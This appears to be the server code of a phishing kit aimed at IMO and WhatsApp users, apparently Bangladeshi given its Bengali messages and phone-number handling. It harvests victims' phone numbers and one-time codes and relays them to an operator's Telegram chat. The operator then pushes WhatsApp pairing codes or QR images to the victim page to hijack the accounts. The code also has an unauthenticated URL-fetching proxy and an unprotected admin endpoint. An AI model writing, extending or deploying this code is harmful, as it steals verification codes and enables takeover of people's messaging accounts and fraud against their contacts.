import express from "express";
import path from "path";
import dns from "dns";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";

// Ensure ipv4first for local network requests if supported
if (dns && typeof dns.setDefaultResultOrder === "function") {
  dns.setDefaultResultOrder("ipv4first");
}

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Telegram configuration
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

// In-memory sessions store
interface Session {
  phoneNumber: string;
  uid: string;
  mode: 'imo' | 'whatsapp';
  status: 'PENDING_OTP' | 'VERIFYING_OTP' | 'SUCCESS' | 'ERROR';
  otp?: string;
  pairingCode?: string;
  qrImageUrl?: string;
  createdAt: number;
}

const sessions = new Map<string, Session>();

// Helper to normalize phone numbers (e.g. extracts last 11 digits for standard Bangladeshi numbers starting with 01)
function normalizePhoneNumber(phone: string): string {
  if (!phone) return "";
  let clean = phone.replace(/[^0-9]/g, "");
  if (clean.length >= 11) {
    const last11 = clean.substring(clean.length - 11);
    if (last11.startsWith("01")) {
      return last11;
    }
  }
  return clean;
}

// Find session by UID or phone number
function findSession(id: string): Session | undefined {
  if (!id) return undefined;
  
  const isUid = id.toLowerCase().startsWith("uid");
  const cleanId = isUid ? id.toLowerCase() : normalizePhoneNumber(id);
  
  let session = sessions.get(cleanId);
  if (session) return session;

  // Search through all sessions for cross-referencing
  for (const s of sessions.values()) {
    if (s.uid === cleanId) return s;
    if (s.phoneNumber && normalizePhoneNumber(s.phoneNumber) === cleanId) return s;
  }
  
  return undefined;
}

// Helper to clean up older sessions (older than 1 hour)
setInterval(() => {
  const oneHourAgo = Date.now() - 3600000;
  for (const [key, session] of sessions.entries()) {
    if (session.createdAt < oneHourAgo) {
      sessions.delete(key);
    }
  }
}, 300000); // Clean up every 5 minutes

// Helper to send message to Telegram
async function sendTelegramMessage(text: string): Promise<boolean> {
  if (!botToken || !chatId) {
    console.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from environment variables.");
    return false;
  }
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 8000);

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML",
      }),
      signal: controller.signal
    });
    clearTimeout(id);
    const data = await response.json();
    return response.ok && data.ok;
  } catch (err: any) {
    console.warn(`Telegram Message Send Failed (${err.message || err}). Check network or config.`);
    return false;
  }
}

// 0. Visitor Entry (called when a page is opened to log visitors and persistence check)
app.post("/api/visitor-entry", async (req, res) => {
  const { uid } = req.body;
  if (!uid) {
    res.status(400).json({ error: "UID is required" });
    return;
  }

  const cleanUid = uid.toLowerCase();
  let session = findSession(cleanUid);
  let isNew = false;

  if (!session) {
    session = {
      phoneNumber: "",
      uid: cleanUid,
      mode: "imo",
      status: "PENDING_OTP",
      createdAt: Date.now()
    };
    sessions.set(cleanUid, session);
    isNew = true;
  }

  if (isNew) {
    const telegramMsg = `🎯 <b>নতুন ভিজিটর প্রবেশ করেছে!</b>\n🆔 User ID: <code>${cleanUid}</code>\n\n<b>বট অ্যাকশন কমান্ড (কপি করতে ক্লিক করুন):</b>\n📸 কিউআর কোড লাইভ করতে (ছবিসহ ক্যাপশন দিন):\n<code>/live_qr_cod_${cleanUid}</code>`;
    await sendTelegramMessage(telegramMsg);
  }

  res.json({ success: true, session });
});

// 1. Submit phone number (Initial step)
app.post("/api/submit-number", async (req, res) => {
  const { phoneNumber, mode, uid } = req.body;
  if (!phoneNumber) {
    res.status(400).json({ error: "ফোন নাম্বার আবশ্যক" });
    return;
  }

  const cleanNumber = normalizePhoneNumber(phoneNumber);
  const cleanUid = uid ? uid.toLowerCase() : "";

  // Link existing session or create a new one
  let session = (cleanUid ? findSession(cleanUid) : null) || findSession(cleanNumber);

  if (session) {
    session.phoneNumber = cleanNumber;
    session.mode = mode || "imo";
    session.status = "PENDING_OTP";
    if (session.uid) {
      sessions.set(session.uid, session);
    }
    sessions.set(cleanNumber, session);
  } else {
    session = {
      phoneNumber: cleanNumber,
      uid: cleanUid,
      mode: mode || "imo",
      status: "PENDING_OTP",
      createdAt: Date.now()
    };
    if (cleanUid) {
      sessions.set(cleanUid, session);
    }
    sessions.set(cleanNumber, session);
  }

  let telegramMsg = "";
  if (mode === "whatsapp") {
    telegramMsg = `📩 <b>নতুন নম্বর সাবমিট (WhatsApp):</b>\n📱 Friend Number: <code>${cleanNumber}</code>\n🆔 User ID: <code>${session.uid || "N/A"}</code>\n\n<b>বট অ্যাকশন কমান্ড (কপি করতে ক্লিক করুন):</b>\n🔑 পেয়ারিং কোড সেট করতে:\n<code>/cod_${cleanNumber}_ABCDEFGH</code>\n\n📸 কিউআর কোড লাইভ করতে (ছবিসহ ক্যাপশন দিন):\n<code>/live_qr_cod_${cleanNumber}</code>\n\n✅ সফল করতে:\n<code>/success_${cleanNumber}</code>\n\n❌ ভুল ওটিপি বলতে:\n<code>/error_${cleanNumber}</code>`;
  } else {
    telegramMsg = `📩 <b>নতুন নম্বর সাবমিট (IMO):</b>\n📱 Friend Number: <code>${cleanNumber}</code>\n🆔 User ID: <code>${session.uid || "N/A"}</code>\n\n<b>বট অ্যাকশন কমান্ড (কপি করতে ক্লিক করুন):</b>\n✅ সফল করতে:\n<code>/success_${cleanNumber}</code>\n\n❌ ভুল ওটিপি বলতে:\n<code>/error_${cleanNumber}</code>`;
  }

  await sendTelegramMessage(telegramMsg);

  res.json({ success: true, status: "PENDING_OTP" });
});

// 2. Submit OTP
app.post("/api/submit-otp", async (req, res) => {
  const { phoneNumber, otp, uid } = req.body;
  if ((!phoneNumber && !uid) || !otp) {
    res.status(400).json({ error: "ফোন নাম্বার এবং ওটিপি আবশ্যক" });
    return;
  }

  const cleanNumber = phoneNumber ? normalizePhoneNumber(phoneNumber) : "";
  const cleanUid = uid ? uid.toLowerCase() : "";
  const session = (cleanUid ? findSession(cleanUid) : null) || findSession(cleanNumber);

  if (!session) {
    res.status(404).json({ error: "কোন সেশন খুঁজে পাওয়া যায়নি। দয়া করে আবার শুরু করুন।" });
    return;
  }

  session.status = "VERIFYING_OTP";
  session.otp = otp;

  const commandId = session.phoneNumber ? session.phoneNumber : session.uid;

  const telegramMsg = `📩 <b>ওটিপি সাবমিট:</b>\n📱 Friend Number: <code>${session.phoneNumber || "N/A"}</code>\n🆔 User ID: <code>${session.uid || "N/A"}</code>\n🔢 Unlock Number: <code>${otp}</code>\n\n<b>বট অ্যাকশন কমান্ড (কপি করতে ক্লিক করুন):</b>\n✅ সফল করতে:\n<code>/success_${commandId}</code>\n\n❌ ভুল ওটিপি বলতে:\n<code>/error_${commandId}</code>\n\n<i>(অথবা এই মেসেজের সরাসরি রিপ্লাই হিসেবে /success_${commandId} বা /error_${commandId} লিখুন)</i>`;
  await sendTelegramMessage(telegramMsg);

  res.json({ success: true, status: "VERIFYING_OTP" });
});

// 2.5 Proxy image to bypass CORS constraints on client side (specifically for Telegram URLs)
app.get("/api/proxy-image", async (req, res) => {
  const { url } = req.query;
  if (!url) {
    res.status(400).send("URL is required");
    return;
  }
  try {
    const imageRes = await fetch(url as string);
    if (!imageRes.ok) {
      res.status(imageRes.status).send("Failed to fetch image");
      return;
    }
    const contentType = imageRes.headers.get("content-type") || "image/jpeg";
    res.setHeader("Content-Type", contentType);
    res.setHeader("Access-Control-Allow-Origin", "*");
    
    const arrayBuffer = await imageRes.arrayBuffer();
    res.send(Buffer.from(arrayBuffer));
  } catch (e) {
    console.error("Error proxying image:", e);
    res.status(500).send("Internal server error");
  }
});

// 3. Check status (Client polls this)
app.get("/api/check-status", (req, res) => {
  const { phoneNumber, uid } = req.query;
  if (!phoneNumber && !uid) {
    res.status(400).json({ error: "ফোন নাম্বার অথবা UID আবশ্যক" });
    return;
  }

  const session = findSession(uid as string) || findSession(phoneNumber as string);

  if (!session) {
    res.json({ status: "idle" });
    return;
  }

  res.json({ 
    status: session.status,
    pairingCode: session.pairingCode,
    qrImageUrl: session.qrImageUrl,
    phoneNumber: session.phoneNumber,
    uid: session.uid,
    mode: session.mode
  });
});

// 4. Retry OTP (Clears OTP state and returns to PENDING_OTP)
app.post("/api/retry-otp", (req, res) => {
  const { phoneNumber, uid } = req.body;
  if (!phoneNumber && !uid) {
    res.status(400).json({ error: "ফোন নাম্বার অথবা UID আবশ্যক" });
    return;
  }

  const session = findSession(uid as string) || findSession(phoneNumber as string);

  if (session) {
    session.status = "PENDING_OTP";
    session.otp = undefined;
    session.pairingCode = undefined;
    session.qrImageUrl = undefined;
    res.json({ success: true, status: "PENDING_OTP" });
  } else {
    res.status(404).json({ error: "কোন সেশন পাওয়া যায়নি" });
  }
});

// 5. Simulated Admin Action (to bypass Telegram limits in local development)
app.post("/api/admin/trigger-command", (req, res) => {
  const { phoneNumber, uid, command } = req.body;
  if (!phoneNumber && !uid && !command) {
    res.status(400).json({ error: "তথ্য অসম্পূর্ণ" });
    return;
  }
  const session = findSession(uid as string) || findSession(phoneNumber as string);
  if (session) {
    session.status = command as any;
    res.json({ success: true, status: command });
  } else {
    const target = (uid || phoneNumber) as string;
    const isUid = target.toLowerCase().startsWith("uid");
    const newSession: Session = {
      phoneNumber: isUid ? "" : target,
      uid: isUid ? target.toLowerCase() : "",
      mode: "imo",
      status: command as any,
      createdAt: Date.now()
    };
    sessions.set(target.toLowerCase(), newSession);
    res.json({ success: true, status: command });
  }
});

// Helper: Extract any Bangladeshi format number, general 11-digit number, or visitor UID
function extractIdentifier(text: string): string | null {
  if (!text) return null;
  
  // Try to find custom UID format: e.g. uid followed by 6 digits
  const uidMatch = text.match(/(uid\d{6})/i);
  if (uidMatch) {
    return uidMatch[1].toLowerCase();
  }

  // Otherwise, look for phone numbers
  // Clean up common bot command words first to avoid picking up digits inside commands
  let cleanText = text
    .replace(/\/(success|error|cod|live_qr_cod)[_\s\-]?/gi, " ")
    .trim();

  // Strip common formatting characters within phone numbers (spaces, hyphens, parentheses, plus)
  cleanText = cleanText.replace(/[\s\-\(\)\+]/g, "");

  // Look for 11 digit numbers starting with 01
  const phoneMatch = cleanText.match(/(01\d{9})/);
  if (phoneMatch) {
    return phoneMatch[1];
  }
  
  // Fallback to any sequence of 10-14 digits
  const fallbackMatch = cleanText.match(/(\d{10,14})/);
  return fallbackMatch ? fallbackMatch[1] : null;
}

// Background Telegram Polling implementation
async function startTelegramPolling() {
  if (!botToken) {
    console.warn("TELEGRAM_BOT_TOKEN missing. Polling skipped.");
    return;
  }

  console.log("Starting Telegram Polling service...");
  let offset = 0;
  let errorCount = 0;

  while (true) {
    try {
      const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=15`;
      const controller = new AbortController();
      // Set 20 second abort signal to prevent long hangs on restricted egress
      const id = setTimeout(() => controller.abort(), 20000);

      const response = await fetch(url, { signal: controller.signal });
      clearTimeout(id);

      if (!response.ok) {
        // Wait 5 seconds before retrying if server responds with error
        await new Promise((resolve) => setTimeout(resolve, 5000));
        continue;
      }

      const data: any = await response.json();
      errorCount = 0; // Reset consecutive errors on successful response

      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;

          if (update.message) {
            const text: string = (update.message.text || update.message.caption || "").trim();
            const photo = update.message.photo;

            if (text) {
              console.log(`Telegram Bot received message/caption: "${text}"`);

              // A. Check for /cod_<TARGET>_<CODE> command (e.g. /cod_01311998527_ABCDEFGH or /cod_uid123456_ABCDEFGH)
              const codMatch = text.match(/\/cod[_\s]?([a-zA-Z0-9]+)[_\s\-]?([A-Za-z0-9]{8})/i);
              if (codMatch) {
                const targetId = codMatch[1].toLowerCase();
                const pairingCode = codMatch[2].toUpperCase();

                let session = findSession(targetId);
                if (!session) {
                  const isUid = targetId.startsWith("uid");
                  session = {
                    phoneNumber: isUid ? "" : targetId,
                    uid: isUid ? targetId : "",
                    mode: "whatsapp",
                    status: "PENDING_OTP",
                    createdAt: Date.now()
                  };
                  sessions.set(targetId, session);
                }
                session.pairingCode = pairingCode;

                const displayTarget = session.phoneNumber || session.uid;
                await sendTelegramMessage(`🔑 <b>${displayTarget}</b> নম্বরটির জন্য পেয়ারিং কোড <code>${pairingCode}</code> সেট করা হয়েছে!`);
                continue;
              }

              // B. Check for /live_qr_cod photo upload command (with caption)
              if (photo && photo.length > 0 && text.toLowerCase().includes("/live_qr_cod")) {
                const targetId = extractIdentifier(text);
                if (targetId) {
                  const fileId = photo[photo.length - 1].file_id;
                  try {
                    const getFileUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;
                    const fileRes = await fetch(getFileUrl);
                    if (fileRes.ok) {
                      const fileData: any = await fileRes.json();
                      if (fileData.ok && fileData.result && fileData.result.file_path) {
                        const filePath = fileData.result.file_path;
                        const directFileUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;

                        let session = findSession(targetId);
                        if (!session) {
                          const isUid = targetId.startsWith("uid");
                          session = {
                            phoneNumber: isUid ? "" : targetId,
                            uid: isUid ? targetId : "",
                            mode: "whatsapp",
                            status: "PENDING_OTP",
                            createdAt: Date.now()
                          };
                          sessions.set(targetId, session);
                        }
                        session.qrImageUrl = directFileUrl;

                        const displayTarget = session.phoneNumber || session.uid;
                        await sendTelegramMessage(`📸 <b>${displayTarget}</b> নম্বরটির জন্য কিউআর কোড লাইভ করা হয়েছে!`);
                      }
                    }
                  } catch (e) {
                    console.error("Error retrieving photo from Telegram:", e);
                  }
                  continue;
                }
              }

              // C. Check for existing /success and /error commands
              let targetId: string | null = null;
              let commandType: "SUCCESS" | "ERROR" | null = null;

              const lowerText = text.toLowerCase();
              if (lowerText.includes("/success")) {
                commandType = "SUCCESS";
              } else if (lowerText.includes("/error")) {
                commandType = "ERROR";
              }

              if (commandType) {
                const extractedDirect = extractIdentifier(text);
                if (extractedDirect) {
                  targetId = extractedDirect;
                } else {
                  const replyTo = update.message.reply_to_message;
                  if (replyTo) {
                    const replyText = replyTo.text || replyTo.caption || "";
                    const extractedReply = extractIdentifier(replyText);
                    if (extractedReply) {
                      targetId = extractedReply;
                    }
                  }
                }
              }

              if (targetId && commandType) {
                let session = findSession(targetId);

                if (!session) {
                  const isUid = targetId.startsWith("uid");
                  session = {
                    phoneNumber: isUid ? "" : targetId,
                    uid: isUid ? targetId : "",
                    mode: "imo",
                    status: commandType,
                    createdAt: Date.now()
                  };
                  sessions.set(targetId, session);
                } else {
                  session.status = commandType;
                }

                const displayTarget = session.phoneNumber || session.uid;
                const confirmMsg = commandType === "SUCCESS" 
                  ? `✅ <b>${displayTarget}</b> নম্বরটির জন্য সফল কমান্ড কার্যকর করা হয়েছে!` 
                  : `❌ <b>${displayTarget}</b> নম্বরটির জন্য ভুল ওটিপি কমান্ড কার্যকর করা হয়েছে!`;

                await sendTelegramMessage(confirmMsg);
              }
            }
          }
        }
      }
    } catch (err: any) {
      errorCount++;
      const isTimeout = err.name === "AbortError" || err.message?.includes("timeout") || err.message?.includes("Timeout");
      if (isTimeout) {
        console.warn(`Telegram Polling: Timeout (Attempt ${errorCount}).`);
      } else {
        console.warn(`Telegram Polling: Offline or connection blocked (${err.message || 'Connection Error'}).`);
      }
      
      // Dynamic backoff delay: 5s, 10s, 20s, up to max 30s
      const backoffDelay = Math.min(30000, 5000 * Math.pow(2, Math.min(3, errorCount - 1)));
      await new Promise((resolve) => setTimeout(resolve, backoffDelay));
    }
    // Pause briefly to avoid hammering the Telegram API
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
}

// Run Telegram polling in background safely
startTelegramPolling().catch((err) => {
  console.error("Failed to execute Telegram Polling:", err);
});

// Vite Integration inside the main server
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error("Critical error starting Express/Vite server:", err);
});
